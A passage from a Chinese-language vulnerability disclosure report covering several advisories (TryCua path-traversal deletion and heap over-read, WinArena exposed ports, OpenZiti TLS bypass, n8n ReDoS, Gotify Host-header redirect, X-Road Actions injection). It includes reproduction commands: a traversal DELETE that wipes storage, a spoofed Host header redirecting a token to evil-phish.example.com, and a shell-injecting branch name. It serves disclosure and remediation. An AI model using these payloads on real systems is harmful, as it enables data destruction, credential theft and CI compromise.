因此，攻击者甚至不需要先发起分片上传，只需发送一次 `DELETE /daytona/anykey?uploadId=../objects`，`root.join("uploads").join("../objects")` 就会解析为 `<root>/objects`，**直接递归删除整个对象存储库中的所有镜像与快照文件**。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 多租户沙箱平台中单个低权限租户一键清空全组织沙箱镜像库：**
  1. 在共享 `cua-spacesd` 对象存储的多租户环境中，某租户发送 `DELETE /daytona/x?uploadId=../objects`。
  2. `tokio::fs::remove_dir_all` 立即清空 `<root>/objects/daytona`，导致所有租户的沙箱快照丢失、新建沙箱全部失败。
* **场景 B — 利用多层 `../` 遍历删除 `d.objects.root` 之外的宿主机应用目录：**
  1. 攻击者发送 `DELETE /daytona/x?uploadId=../../state` 或指向其他可写目录的相对路径。
  2. `remove_dir_all` 跳出对象存储根目录，将 `cua-spacesd` 进程拥有写权限的宿主机配置或数据库目录一并删除。
* **场景 C — 利用 `PUT ?partNumber=1&uploadId=../stage` 向相邻目录写入污染文件：**
  1. 在 `Method::PUT` 分支（第 `360-383` 行）中，攻击者通过 `?partNumber=1&uploadId=../stage` 将任意分片数据写入 `uploads/` 之外的相邻目录。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在本地隔离测试环境中复现 DELETE ?uploadId=../objects
curl -i -X DELETE "http://127.0.0.1:9000/daytona/dummy-key?uploadId=../objects" \
  -H "Authorization: Bearer <push-token>"

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand03 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "delete_traversal_status": 204,
    "objects_store_wiped_without_prior_upload": true
  },
  "GREEN": {
    "delete_traversal_status": 400,
    "delete_uninitiated_id_status": 404,
    "objects_store_preserved": true
  },
  "BENIGN": {
    "valid_upload_abort_status": 204,
    "staging_dir_removed": true
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe Rust `VtEncoder::encode` 未校验切片长度直接调用 `unsafe { copy_nonoverlapping }` 导致堆越界读取（`GHSA-54v9-fxw3-36mm`，`CWE-125`/`CWE-190`，CVSS `5.5 Medium`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `trycua/cua`（`Cargo: cua-media-codec <= 0.8.0`）
* **受影响版本与组件：** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs`（`VtEncoder::encode` -> `pixel_buffer_for`，第 `308-420` 行）
* **漏洞类型与评分：** `CWE-125`（越界读取）/ `CWE-190`（整数溢出或回绕）— **CVSS v3.1: `5.5 Medium`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`）
* **GitHub GHSA 链接：** `GHSA-54v9-fxw3-36mm`（`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/zh-CN/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在 Rust 语言中，未标记 `unsafe` 的公开函数（`pub fn encode(&mut self, frame: &VideoFrame)`）必须保证对任何传入参数都是内存安全的。然而在 macOS VideoToolbox 硬件编码器的 `pixel_buffer_for` 函数（第 `308-420` 行）中，代码从未检查 `FrameData::Nv12`（`y` 与 `uv` 切片）或 `FrameData::Bgra`（`data` 切片）的实际字节长度是否足够，便直接执行指针偏移与 `unsafe { std::ptr::copy_nonoverlapping }`：
```rust
// libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs:344-367
unsafe {
    let y_dst = CVPixelBufferGetBaseAddressOfPlane(pb, 0) as *mut u8;
    let y_dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
    for row in 0..h {
        // 缺陷：未检查 y.len() 是否大于等于 row * (*y_stride as usize) + w！
        std::ptr::copy_nonoverlapping(
            y.as_ptr().add(row * (*y_stride as usize)),
            y_dst.add(row * y_dst_stride),
            w,
        );
    }
```
当传入的图像缓冲区长度小于 `stride * height` 时，`copy_nonoverlapping` 会越过切片末尾，**直接读取相邻堆内存中的机密数据（如会话令牌、私钥或其他租户内存），并将其编码进 H.264 视频帧发送给远程客户端**，或者因读取未映射内存页而触发 `SIGSEGV` 崩溃。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — macOS 远程桌面推流分辨率动态切换时将相邻堆内存机密（`960` 字节）编码进视频流：**
  1. 远程桌面窗口大小调整瞬间，采集端传入了一个截断的 `FrameData::Nv12` 切片。
  2. `pixel_buffer_for` 越界读取相邻堆内存中的 `960` 字节并写入 `CVPixelBuffer`，导致进程堆内的敏感凭据混入视频流发往客户端。
* **场景 B — 畸形或空 `VideoFrame` 触发 `cua-spacesd` 媒体守护进程 `SIGSEGV` 崩溃：**
  1. 传入空的 `y: &[]` 或截断的 `BGRA` 帧时，Safe Rust 调用直接解引用越界指针，导致整个 `cua-spacesd` 媒体服务崩溃，所有活动远程桌面连接中断。
* **场景 C — 多会话 macOS 代理主机中畸形 `stride` 跨缓冲区读取其他会话内存：**
  1. 当 `y_stride` / `uv_stride` 与帧宽高不匹配时，指针步进越过当前缓冲区边界，在多会话共享进程中造成跨会话信息泄露。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 查看 videotoolbox/mod.rs 中的 copy_nonoverlapping 源码实现
sed -n '335,415p' /path/to/cua/libs/cua/crates/cua-media-codec/src/videotoolbox/mod.rs

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "oob_bytes_read": 960,
    "adjacent_heap_secret_copied_to_video_frame": true
  },
  "GREEN": {
    "oob_bytes_read": 0,
    "adjacent_heap_secret_copied_to_video_frame": false,
    "error": "CodecError::InvalidArgument"
  },
  "BENIGN": {
    "valid_frame_encoded_bytes": 1536
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — 无认证 `0.0.0.0:8006`（noVNC）与免密 `0.0.0.0:3390`（RDP）局域网暴露 + 可写宿主机 `/shared` 挂载（`GHSA-hvhg-6x47-cq96`，`CWE-668`/`CWE-732`，CVSS `8.6 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `trycua/cua`（`pip: cua-bench <= 0.3.1`）
* **受影响版本与组件：** `<= 0.3.1`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench/tasks/winarena_adapter/cli.py`（`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`，第 `262-265, 421-424, 646-649` 行）及 `infra/vm/setup/server/main.py`（第 `180-248, 290-321` 行）
* **漏洞类型与评分：** `CWE-668`（资源暴露于错误范围）/ `CWE-732`（关键资源权限分配不当）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`）
* **GitHub GHSA 链接：** `GHSA-hvhg-6x47-cq96`（`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/zh-CN/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在 Docker 启动命令中，不带 `127.0.0.1:` 前缀的 `-p 8006:8006` 会将端口绑定在 **`0.0.0.0`（宿主机所有无线与有线网卡）** 上，并经由 Linux `iptables` 的 `DOCKER` 转发链绕过常规 `ufw` 入站防火墙规则。

在 WinArena 编排脚本（`cli.py:262-265, 421-424, 646-649`）中，全部三个启动命令均使用了如下配置：
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (及 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # 缺陷 1：0.0.0.0:8006 -> 将无密码认证的 noVNC Web 桌面暴露给整个局域网！
"-p", f"{args.rdp_port}:3389",     # 缺陷 2：0.0.0.0:3390 -> 将免密 Windows RDP 暴露给整个局域网！
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # 缺陷 3：将宿主机 Python 包内的 setup 源码目录以可写模式(:rw)挂载进容器！
```
这导致同一局域网内的任何人都能直接在浏览器中打开 Windows VM 桌面，并可通过容器/VM 内可写的 `/shared` 挂载目录反向篡改宿主机上的脚本文件。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 大学实验室或企业办公局域网内通过 `0.0.0.0:8006`（noVNC）/ `3390`（RDP）接管 Windows VM 与 API 密钥：**
  1. 研究人员在实验室局域网工作站上启动 WinArena 基准测试。
  2. 同一局域网内的攻击者在浏览器访问 `http://<工作站IP>:8006`，无需任何密码即进入实时 Windows 桌面，窃取评测环境中注入的 OpenAI / Anthropic API 密钥。
* **场景 B — 通过可写的 `-v {setup_path}:/shared` 挂载从受控 VM 反向污染宿主机文件系统：**
  1. 攻击者进入 VM 后，修改 `/shared`（对应宿主机上的 `winarena_adapter/infra/vm/setup` 目录）中的 Python 与批处理安装脚本。
  2. 当宿主机再次运行相关命令或导入该目录文件时，恶意代码直接在宿主机操作系统上执行。
* **场景 C — 利用 VM 内部 `0.0.0.0:5000` 控制服务的无认证 `POST /execute_windows`（`exec()`）执行任意命令：**
  1. VM 内运行的 `infra/vm/setup/server/main.py`（第 `180-248` 行）无认证暴露了直接调用 Python `exec()` 的 `/execute_windows` 与开启 `shell=True` 的 `/setup/launch`，任何能够访问该端口的流量或网页均可执行任意系统指令。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 查看 cli.py 中的 Docker 端口映射与挂载源码
sed -n '255,272p' /path/to/cua/libs/cua-bench/tasks/winarena_adapter/cli.py

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "lan_exposed_ports": ["8006:8006", "3390:3389"],
    "host_setup_dir_mounted_writable": true,
    "host_setup_file_tampered_from_container": true
  },
  "GREEN": {
    "lan_exposed_ports": [],
    "loopback_bound_ports": ["127.0.0.1:8006:8006", "127.0.0.1:3390:3389"],
    "host_setup_dir_mounted_writable": false,
    "readonly_mount": true
  }
}
```

---

### III.08 — OpenZiti (`ziti` CLI) — `AreCertsTrusted` -> `InsecureClient` 无条件设置 `InsecureSkipVerify: true` 导致 TLS 证书验证绕过（`GHSA-qwv8-hh9r-cqrf`，`CWE-295`，CVSS `7.4 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `openziti/ziti`（`Go: github.com/openziti/ziti/v2`）
* **受影响版本与组件：** `v2.0.0-pre6` 及更早版本（`commit 08f09c510bb2673d3632419ba8d6e10002d5eb00`）— `ziti/util/certs.go`（`AreCertsTrusted` 第 `91-103` 行、`InsecureClient` 第 `199-208` 行）及 `ziti/cmd/edge/login.go`（第 `319-390` 行）
* **漏洞类型与评分：** `CWE-295`（证书验证不当）— **CVSS v3.1: `7.4 High`**（`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA 链接：** `GHSA-qwv8-hh9r-cqrf`（`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/zh-CN/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
当管理员运行 `ziti edge login` 登录 OpenZiti 零信任控制器时，CLI 会调用 `AreCertsTrusted(host)`（`certs.go:91-103`）来检查服务器证书是否受信任。开发者原本希望在遇到不受信任证书时捕获 `x509.UnknownAuthorityError` 并提示用户确认。

然而，`AreCertsTrusted` 内部调用的辅助函数 `InsecureClient(&client, certs)`（第 `199-208` 行）无条件设置了 `InsecureSkipVerify: true`：
```go
// ziti/util/certs.go:91-103, 199-208
func AreCertsTrusted(host string, certs []*x509.Certificate) (bool, error) {
    client := resty.New()
    InsecureClient(client, certs) // <--- 配置 TLS 客户端
    _, err := client.R().Get(host)
    if err != nil {
        if errors.Is(err, &x509.UnknownAuthorityError{}) { // 死代码！永远不可能触发！
            return false, nil
        }
        return false, err
    }
    return true, nil
}

func InsecureClient(client *resty.Client, certs []*x509.Certificate) {
    tlsCfg := &tls.Config{
        InsecureSkipVerify: true, // 缺陷：无条件设置为 true！
    }
    if len(certs) > 0 {
        tlsCfg.RootCAs = x509.NewCertPool()
        for _, c := range certs {
            tlsCfg.RootCAs.AddCert(c)
        }
        // 即使填充了 RootCAs，InsecureSkipVerify 依然为 true！
    }
    client.SetTLSClientConfig(tlsCfg)
}
```
在 Go 标准库 `crypto/tls` 中，**只要 `InsecureSkipVerify: true` 开启，TLS 握手就会完全跳过所有证书链、CA 签名和主机名校验**，永远不会返回 `x509.UnknownAuthorityError`。结果，无论中间人（MITM）提供任何伪造的自签名证书，`AreCertsTrusted()` 都会返回 `true, nil`，CLI 还会打印 **`"Verified that server supplied certificates are trusted"`（已验证服务器提供的证书受信任）**，紧接着把管理员账号和密码直接发送给中间人攻击者！

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 运维工程师通过 Wi-Fi/VPN 执行 `ziti edge login` 时遭遇中间人劫持并泄露管理员密码：**
  1. 工程师在外部网络执行 `ziti edge login https://ziti-controller.corp.example:1280 -u admin -p <password>`。
  2. 网络中间人拦截连接并返回伪造的自签名证书。
  3. `AreCertsTrusted()` 错误判定伪造证书受信任，不弹出任何确认提示即向攻击者发送 `POST /edge/management/v1/authenticate?method=password` 请求，泄露管理员凭据。
* **场景 B — 自动化 CI/CD 与 Kubernetes 节点引导脚本向伪造的 Edge Controller 注册身份：**
  1. 自动化部署流水线调用 `ziti edge login` 配置零信任网格策略。
  2. 当遭遇 DNS 欺骗或路由劫持时，CLI 毫无告警地信任恶意控制器并上传生产服务令牌。
* **场景 C — 生产环境中过期、吊销或错误 CA 签发的控制器证书被静默接受：**
  1. 即使控制器证书已过期或由非授权 CA 签发，`ziti edge login` 依然报告证书受信任，导致零信任 PKI 边界形同虚设。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 查看 ziti/util/certs.go 中 AreCertsTrusted 与 InsecureClient 的源码
sed -n '90,105p;198,210p' /path/to/ziti/ziti/util/certs.go

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "rogue_mitm_cert_accepted_as_trusted": true,
    "admin_credentials_sent_to_mitm": true
  },
  "GREEN": {
    "rogue_mitm_cert_accepted_as_trusted": false,
    "admin_credentials_sent_to_mitm": false,
    "error": "x509.UnknownAuthorityError"
  },
  "BENIGN": {
    "valid_ca_cert_trusted": true
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` 中无长度限制的 `EMAIL_REGEXP` 与 `DOMAIN_EXTRACT_REGEXP`（`isEmail` / `extractEmail` / `extractDomain`）引发 Webhook 事件循环阻塞（`ReDoS`，`CWE-1333`，CVSS `5.3 Medium`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `n8n-io/n8n`（`npm: n8n-workflow <= 2.45.0`）
* **受影响版本与组件：** `<= 2.45.0`（`commit 976c80c63ba38fffe1ffde1fb6fb6fb4edbe8b51`）— `packages/workflow/src/extensions/string-extensions.ts`（第 `59, 94, 326, 375, 383` 行）
* **漏洞类型与评分：** `CWE-1333`（低效正则表达式复杂度 / ReDoS）— **CVSS v3.1: `5.3 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/zh-CN/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在 `n8n` 自动化工作流中，用户经常在 Webhook 表达式里调用 `.isEmail()`、`.extractEmail()` 或 `.extractDomain()` 来校验或提取外部输入。

然而在 `string-extensions.ts` 中，这些辅助方法在调用正则表达式前 **没有对输入字符串做任何长度上限检查**，且所使用的正则表达式既没有起始锚点（`^`），又包含嵌套重复量词（`(\.[^<>()[\]\\.,;:\s@"]+)*`）：
```typescript
// packages/workflow/src/extensions/string-extensions.ts:59, 94
const EMAIL_REGEXP =
  /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

const DOMAIN_EXTRACT_REGEXP = /^(?:https?:\/\/)?(?:www\.)?((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(?:\/|$)/;
```
由于 Node.js 采用单线程事件循环处理所有并发 HTTP 请求，当攻击者发送一个仅 20 KB 的 `"a.a.a...a@!"` 字符串时，V8 正则引擎会在每一个字符偏移位置重复回溯，导致 **单次请求阻塞 Node.js 主线程约 832 毫秒**，使同一实例上的所有其他工作流与 Web 界面陷入停顿。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 向公开表单 Webhook 发送轻量级请求冻结整台服务器的 Stripe 支付与 Slack Webhook：**
  1. 企业公开了一个用于接收网站注册或咨询表单的 n8n Webhook，并在节点表达式中使用 `{{ $json.body.email.isEmail() }}`。
  2. 攻击者发送 10 个并发的 20 KB JSON 请求。
  3. Node.js 主事件循环被持续阻塞数秒，导致同一 n8n 服务器上正在处理的 Stripe 支付回调、Slack 告警通知以及管理后台全部超时无响应。
* **场景 B — 自动解析客服邮件或工单的 `extractEmail()` 流程触发容器健康检查重启循环：**
  1. 自动化工单工作流对收到的邮件正文调用 `{{ $json.text.extractEmail() }}`。
  2. 一封包含长串点号文本的垃圾邮件即可卡死 Worker 线程，导致 Kubernetes 存活探针（Liveness Probe）超时并不断重启容器。
* **场景 C — CRM 数据清洗工作流调用 `extractDomain()` 耗尽单核 V8 CPU：**
  1. 处理外部 URL 列表的工作流调用 `{{ $json.url.extractDomain() }}` 时遇到长点号主机名字符串，引发灾难性回溯。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 使用 Node.js 单行命令实测 EMAIL_REGEXP 在 20KB 输入下的事件循环阻塞耗时
node -e 'const re = /(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/; const s = "a.".repeat(10000) + "a@!"; const t0 = performance.now(); re.test(s); console.log("Elapsed ms:", (performance.now() - t0).toFixed(2));'

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "regex_stall_ms": 165.035,
    "stall_20kb_ms": 831.78,
    "concurrent_webhook_starved": true
  },
  "GREEN": {
    "regex_stall_ms": 0.017,
    "stall_20kb_ms": 0.0029,
    "concurrent_webhook_starved": false
  },
  "BENIGN": {
    "valid_email_recognized": true
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — 内置 `SSL.RedirectToHTTPS` 中间件（`router.go`）未校验 `ctx.Request.Host` 头导致 `308 Permanent Redirect` 开放重定向与令牌泄露（`GHSA-cc9f-m5vr-pm75`，`CWE-601`，CVSS `4.7 Medium`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `gotify/server`（`Go: github.com/gotify/server/v2`）
* **受影响版本与组件：** `<= v2.9.1`（`commit 97685e2a6f9c02b92263ef0df9831371a79d150b`）— `router/router.go`（第 `52-73, 93-102` 行）
* **漏洞类型与评分：** `CWE-601`（URL 重定向至不受信任站点 / 开放重定向）— **CVSS v3.1: `4.7 Medium`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`）
* **GitHub GHSA 链接：** `GHSA-cc9f-m5vr-pm75`（`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/zh-CN/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
当 Gotify Server 开启内置 TLS（`SSL.Enabled: true`）并启用 HTTP 自动跳转 HTTPS（`SSL.RedirectToHTTPS: true`）时，`router/router.go` 会注册一个重定向中间件。

然而，该中间件既未配置 `AllowedHosts` 白名单，也未使用配置文件中的 `LetsEncrypt.Hosts`，而是 **直接读取客户端请求头中的 `ctx.Request.Host` 构造 `Location` 头，并返回 `HTTP 308 Permanent Redirect`**：
```go
// router/router.go:93-102
httpRouter.Use(func(ctx *gin.Context) {
    if ctx.Request.TLS == nil {
        // 缺陷：直接使用客户端可控的 ctx.Request.Host 构造永久重定向目标！
        location := url.URL{
            Scheme:   "https",
            Host:     ctx.Request.Host,
            Path:     ctx.Request.URL.Path,
            RawQuery: ctx.Request.URL.RawQuery,
        }
        ctx.Redirect(http.StatusPermanentRedirect, location.String()) // 308 Permanent Redirect
        ctx.Abort()
    }
})
```
由于返回的是 `308 Permanent Redirect`，HTTP 客户端与脚本在跟随重定向时会原封不动地保留原始请求方法（如 `POST`）、完整查询参数（`?token=<app-token>`）以及消息正文，直接发往攻击者控制的服务器。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 监控告警脚本（`curl -L` / Python `requests` / Uptime Kuma）跟随 `308` 跳转泄露 `?token=` 应用密钥：**
  1. 运维通知脚本通过 HTTP 请求 `http://gotify.internal/message?token=AgSecretToken123` 发送告警，并开启了自动跟随重定向。
  2. 当请求被注入 `Host: attacker-collector.example` 时，Gotify 返回 `308` 指向 `https://attacker-collector.example/message?token=AgSecretToken123`。
  3. 客户端自动向攻击者服务器重发携带 `?token=` 与告警正文的 POST 请求，导致应用令牌泄露。
* **场景 B — 共享 HTTP 缓存 / 反向代理下的 `308` 缓存投毒与钓鱼劫持：**
  1. 攻击者向位于共享缓存或代理后的 Gotify 发送 `Host: fake-gotify-login.example`。
  2. 被缓存的 `308 Permanent Redirect` 响应会将后续访问的所有正常用户持久重定向到钓鱼登录页面。
* **场景 C — 浏览器永久缓存 `308` 跳转导致后续访问持续被劫持：**
  1. 用户浏览器一旦收到被篡改 `Host` 的 `308` 响应，便会永久缓存该跳转规则，导致后续访问持续发往恶意域名。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在本地隔离测试环境中复现 Host 头重定向与 ?token= 泄露
curl -i "http://127.0.0.1:18080/message?token=secret-app-token" \
  -H "Host: evil-phish.example.com"

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_gotify_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "status_code": 308,
    "location": "https://evil-phish.example.com/message?token=secret-app-token",
    "redirected_to_untrusted_host": true
  },
  "GREEN": {
    "status_code": 308,
    "location": "https://push.corp.example/message?token=secret-app-token",
    "redirected_to_untrusted_host": false,
    "bound_to_configured_ssl_host": true
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — 持久化自托管节点 `xrd-runner-8c` 上 `_build-and-package.yml` 中的 `${{ github.head_ref }}` Shell 命令注入（`GHSA-4fcw-7xqx-fjv5`，`CWE-78`，CVSS `8.5 High`）

#### 1. 元数据与披露状态
* **目标仓库与软件包：** `nordic-institute/X-Road`（GitHub Actions CI/CD 流水线 — `commit 38cd99ec0ebba0bd68a2581ca3c92be2e5f5843f`）
* **受影响版本与组件：** `develop` 分支 — `.github/workflows/build.yaml`（第 `1-55` 行）及 `.github/workflows/_build-and-package.yml`（`Determine target branch` 步骤，第 `84-91` 行）
* **漏洞类型与评分：** `CWE-78`（OS 命令注入）— **CVSS v3.1: `8.5 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`）
* **GitHub GHSA 链接：** `GHSA-4fcw-7xqx-fjv5`（`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`）
* **Sniper 独立安全公告：** [`docs/advisories/zh-CN/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/zh-CN/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. 漏洞如何在代码中产生并转化为安全风险（通俗易懂的分步讲解）
在 GitHub Actions 工作流中，`${{ github.head_ref }}`（Pull Request 的源分支名称）会在 **生成 bash 脚本之前作为纯文本直接替换进 `run:` 块中**。

X-Road 的主构建工作流 `build.yaml` 在 `pull_request` 事件触发时，以 **`contents: write`、`packages: write` 权限以及 `secrets: inherit`（继承全部机密）** 调用复用工作流 `_build-and-package.yml`。而 `_build-and-package.yml` 运行在 **持久化自托管运行器（`runs-on: xrd-runner-8c`）** 上，并在第一个步骤中直接拼接了 `${{ github.head_ref }}`：
```yaml
# .github/workflows/_build-and-package.yml:84-91
jobs:
  build-packages:
    runs-on: xrd-runner-8c
    steps:
      - name: Determine target branch
        run: |
          if [ "${{ github.event_name }}" == "pull_request" ]; then
            echo "TARGET_BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
          else
            echo "TARGET_BRANCH=${{ github.ref_name }}" >> "$GITHUB_ENV"
          fi
```
由于 Git 分支名允许包含双引号（`"`）和分号（`;`），攻击者只需创建名为 `feat";id;env;#` 的分支并发起 PR，生成的 bash 脚本就会变成 `echo "TARGET_BRANCH=feat";id;env;#" >> "$GITHUB_ENV"`，从而在代码审查开始前直接在 `xrd-runner-8c` 自托管构建机上执行任意命令。

#### 3. 日常环境中可能引发的 3 个关键场景（`场景 A / B / C`）
* **场景 A — 通过恶意分支名发起 PR 在自托管运行器 `xrd-runner-8c` 上未审先执行任意命令：**
  1. 拥有分支创建权限的账号或失陷的开发者凭据创建分支 `feat";<恶意命令>;#` 并打开 PR。
  2. 无需等待代码审查或 `actions/checkout`，`Determine target branch` 步骤立即在 `xrd-runner-8c` 主机上执行注入的 Shell 命令。
* **场景 B — 利用继承的 `secrets: inherit` 与 `packages: write` 权限窃取 GHCR 发布令牌与仓库机密：**
  1. 由于 `build.yaml` 授予了 `contents: write`、`packages: write` 与 `secrets: inherit`，注入的命令可直接读取高权限 `GITHUB_TOKEN` 与仓库机密，进而向官方容器镜像库推送被篡改的镜像。
* **场景 C — 污染持久化自托管节点 `xrd-runner-8c` 的本地构建缓存以在后续官方 X-Road 发行包中植入后门：**
  1. `xrd-runner-8c` 是持久化自托管服务器，构建结束后本地文件系统与缓存不会销毁。
  2. 攻击者通过篡改本地 Gradle/Docker 缓存或植入驻留进程，污染后续正常分支构建出的官方 `.deb` / `.rpm` 软件包。

#### 4. 示例执行、复现与验证命令
```bash
# 1. 在源码中核查 build.yaml 与 _build-and-package.yml 的配置
sed -n '1,55p' /path/to/X-Road/.github/workflows/build.yaml
sed -n '80,95p' /path/to/X-Road/.github/workflows/_build-and-package.yml

# 2. 运行 Sniper E2E 验证测试（RED -> GREEN + BENIGN）
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01 -v
```
**实测运行时证明输出（`RED -> GREEN + BENIGN`）：**
```json
{
  "RED": {
    "runs_on": "xrd-runner-8c",
    "secrets_inherit": true,
    "direct_yaml_interpolation": true,
    "arbitrary_command_executed_on_self_hosted_runner": true
  },
  "GREEN": {
    "env_var_parameterized": true,
    "arbitrary_command_executed_on_self_hosted_runner": false
  },
  "BENIGN": {
    "target_branch_written": "feature/normal-branch"
  }
}
```

<!-- GITLAB-ADVISORIES-START -->

---

### III.12 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — OAuth 2.0 Device Authorization Grant (`Oauth::DeviceAuthorizationsController` & `Oauth::TokensController`) Policy Bypass of `disable_admin_oauth_scopes`, Email Confirmation Gate, and Organization Maintenance Mode (`GITLAB-CAND-02A / 02B / 02C`) (`CWE-863 / CWE-285`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
